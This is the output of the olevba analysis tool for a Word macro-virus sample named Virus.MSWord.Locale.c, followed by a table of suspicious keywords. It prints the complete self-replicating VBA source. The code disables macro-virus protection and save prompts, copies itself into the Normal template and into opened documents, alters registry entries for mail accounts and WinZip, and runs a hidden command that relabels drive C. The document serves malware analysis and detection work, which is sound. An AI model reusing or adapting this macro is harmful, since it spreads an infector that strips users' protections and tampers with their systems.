olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Locale.c-6d89b64559942083ed16cd47997c2e12efb23952
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Locale.c-6d89b64559942083ed16cd47997c2e12efb23952 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next

bSavedState = ActiveDocument.Saved
    Set prevDocument = NormalTemplate
    Set nextDocument = newDocument
Options.VirusProtection = Not True
Options.SaveNormalPrompt = Not True
Options.ConfirmConversions = Not True

sLines = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(1, MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)

If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.AddFromString sLines
NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Close()"

System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}", "") = "MY Computer"
System.PrivateProfileString("", "HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon", "") = "C:\\WINDOWS\\SYSTEM\\shell32.dll,15"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000008", "SMTP Display Name") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000008", "SMTP Email Address") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Nico Mak Computing\WinZip\WinIni", "Name") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Nico Mak Computing\WinZip\WinIni", "SN") = "415F7097"
System.PrivateProfileString("win.ini", "WinZip", "Name") = ""
System.PrivateProfileString("win.ini", "WinZip", "Name") = ""
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Applets\Hearts", "name") = ""

Shell "label c: n0nuts", vbHide

ElseIf ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Open()" Then
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.AddFromString sLines
ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 1, "Private Sub Document_Open()"
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If

ActiveDocument.Saved = bSavedState


    With nextDocument.VBProject.VBComponents
        For i = 1 To .Count
            If .Item(i).Type = 100 Then
                With .Item(i).CodeModule
                    If Not .Find("Sub " + nextRoutine + "()", 1, 1, .CountOfLines, 10) Then
                        With prevDocument.VBProject.VBComponents.Item(1).CodeModule
                            codeString = .Lines(.ProcStartLine(nextRoutine, vbext_pk_Proc), .ProcCountLines(nextRoutine, vbext_pk_Proc))
                        End With
                    End If
                    .AddFromString codeString
                    .ReplaceLine 1, "Private Sub " + nextRoutine + "()"
                    If prevDocument Is NormalTemplate Then
                        .ReplaceLine 5, "    Set prevDocument = ActiveDocument"
                        .ReplaceLine 6, "    Set nextDocument = NormalTemplate"
                    Else
                        .ReplaceLine 5, "    Set prevDocument = NormalTemplate"
                        .ReplaceLine 6, "    Set nextDocument = newDocument"
                    End If
                End With
            End If
        Next
    End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |newDocument         |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

